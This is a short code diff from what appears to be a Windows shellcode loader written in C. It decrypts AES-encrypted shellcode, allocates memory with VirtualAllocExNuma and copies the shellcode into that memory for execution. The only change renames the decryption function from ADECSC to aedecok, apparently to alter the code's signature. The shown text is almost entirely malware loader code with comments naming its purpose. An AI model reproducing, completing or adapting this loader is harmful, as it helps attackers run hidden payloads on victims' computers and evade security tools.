@@ -16,7 +16,7 @@ void ldres(const char* resName, unsigned char** data, DWORD* size) {
 }
 
 // Function to decrypt AES encrypted shellcode
-void ADECSC(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
+void aedecok(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
     HCRYPTPROV hProv;
     HCRYPTHASH hHash;
     HCRYPTKEY hKey;
@@ -65,7 +65,7 @@ int main() {
 
     LPVOID memalo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
 
-    ADECSC((char*)codee, sizeof(codee), keyy, sizeof(keyy));  // Decrypt AES shellcode
+    aedecok((char*)codee, sizeof(codee), keyy, sizeof(keyy));  // Decrypt AES shellcode
 
     memcpy(memalo, codee, sizeof(codee));  // Copy decrypted shellcode to allocated memory
     DWORD oldProtect;
